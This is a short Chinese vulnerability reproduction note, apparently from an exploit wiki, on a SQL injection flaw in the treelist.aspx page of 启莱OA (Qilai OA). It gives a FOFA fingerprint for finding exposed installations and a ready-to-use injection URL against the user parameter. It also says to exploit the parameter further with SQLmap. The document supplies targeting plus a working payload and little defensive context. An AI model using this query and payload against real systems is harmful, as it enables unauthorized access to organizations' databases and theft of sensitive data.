# 启莱OA treelist.aspx SQL注入漏洞

## 漏洞描述

启莱OA treelist.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> 启莱OA

## FOFA

> [!NOTE]
>
> app="启莱OA"

## 漏洞复现

登录页面如下

![](http://wikioss.peiqi.tech/vuln/ql-1.png)

存在SQL注入的文件为 treelist.aspx

```
http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1
```

![](http://wikioss.peiqi.tech/vuln/ql-4.png)

使用SQLmap对参数 user 进行注入

![](http://wikioss.peiqi.tech/vuln/ql-5.png)